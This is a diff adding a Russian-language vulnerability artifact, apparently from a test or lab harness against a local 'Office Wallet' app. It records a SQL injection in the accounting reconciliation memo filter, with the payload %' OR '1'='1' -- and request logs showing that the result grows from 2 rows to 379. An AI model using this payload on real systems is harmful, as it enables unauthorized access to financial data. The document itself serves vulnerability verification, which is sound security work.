@@ -1,0 +1,21 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-21
+################################################################################################
+== 5b. OW-21: SQL-инъекция в фильтре бухгалтерской сверки ==
+    · memo напрямую конкатенируется в LIKE. Добавляем OR true и SQL-комментарий;
+    · в ответе должны появиться операции даже при заведомо отсутствующем фильтре.
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT role FROM users WHERE login='ivanov'
+    ← psql admin
+    → POST /accounting/reconcile memo=ow21_no_such_memo_7f91 (контроль без инъекции)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    → POST /accounting/reconcile memo=<OR true + SQL comment>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Сверка · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">  ...
+    ┌─ АРТЕФАКТ · OW-21 · SQL injection развернула фильтр сверки
+    │ контроль memo=ow21_no_such_memo_7f91: строк в таблице=2
+    │ payload memo=%' OR '1'='1' --: строк в таблице=379
+    │ POST /accounting/reconcile → HTTP 200; ответ содержит операции
+    └─
+[+] SQL-предикат WHERE memo LIKE обойдён через введённый фильтр
